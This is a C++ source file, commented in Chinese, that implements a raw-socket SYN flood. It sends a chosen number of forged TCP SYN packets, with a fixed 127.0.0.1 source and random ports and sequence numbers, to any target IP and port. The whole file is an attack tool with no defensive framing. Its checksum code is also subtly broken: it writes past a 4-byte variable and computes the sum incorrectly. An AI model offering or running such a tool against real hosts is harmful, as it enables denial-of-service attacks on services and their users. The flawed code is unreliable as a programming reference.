#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>

using namespace std;

int main(int argc, char *argv[]) {
  if (argc != 4) {
    cout << "Usage: " << argv[0] << " <target_ip> <target_port> <num_packets>"
         << endl;
    return 1;
  }

  // 获取参数
  char *target_ip = argv[1];
  int target_port = atoi(argv[2]);
  int num_packets = atoi(argv[3]);

  // 创建原始套接字
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd < 0) {
    cout << "Failed to create raw socket." << endl;
    return 1;
  }

  // 构造 IP 报文头部
  struct iphdr ip_header;
  ip_header.version = 4;
  ip_header.ihl = 5;
  ip_header.tos = 0;
  ip_header.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
  ip_header.id = htons(rand() % 65535);
  ip_header.frag_off = 0;
  ip_header.ttl = 255;
  ip_header.protocol = IPPROTO_TCP;
  ip_header.check = 0;
  ip_header.saddr = inet_addr("127.0.0.1");
  ip_header.daddr = inet_addr(target_ip);

  // 构造 TCP 报文头部
  struct tcphdr tcp_header;
  tcp_header.source = htons(rand() % 65535);
  tcp_header.dest = htons(target_port);
  tcp_header.seq = rand() % 65535;
  tcp_header.ack_seq = 0;
  tcp_header.res1 = 0;
  tcp_header.doff = sizeof(struct tcphdr) / 4;
  tcp_header.fin = 0;
  tcp_header.syn = 1;
  tcp_header.rst = 0;
  tcp_header.psh = 0;
  tcp_header.ack = 0;
  tcp_header.urg = 0;
  tcp_header.window = htons(1024);
  tcp_header.check = 0;
  tcp_header.urg_ptr = 0;

  // 发送 SYN 报文
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_addr.s_addr = inet_addr(target_ip);
  memset(&dest_addr.sin_zero, 0, sizeof(dest_addr.sin_zero));

  srand(time(NULL));  // 设置随机种子

  for (int i = 0; i < num_packets; i++) {
    ip_header.id = htons(rand() % 65535);       // 设置随机标识符
    tcp_header.source = htons(rand() % 65535);  // 设置随机源端口号
    tcp_header.seq = rand() % 65535;            // 设置随机序列号

    // 计算校验和
    tcp_header.check = 0;
    uint32_t sum = 0;
    memcpy(&sum, &ip_header.saddr, sizeof(ip_header.saddr));
    memcpy(&sum + sizeof(ip_header.saddr), &ip_header.daddr,
           sizeof(ip_header.daddr));
    sum += htons(IPPROTO_TCP + ntohs(sizeof(tcp_header)));
    tcp_header.check = htons(~(sum & 0xFFFF));

    // 发送 SYN 报文
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memcpy(packet, &ip_header, sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr), &tcp_header, sizeof(struct tcphdr));
    if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr,
               sizeof(struct sockaddr)) < 0) {
      cout << "Failed to send packet." << endl;
      return 1;
    }

    // 休眠一段时间，避免过快发送导致拥塞
    usleep(100);
  }

  cout << "Finished sending " << num_packets << " packets." << endl;

  return 0;
}
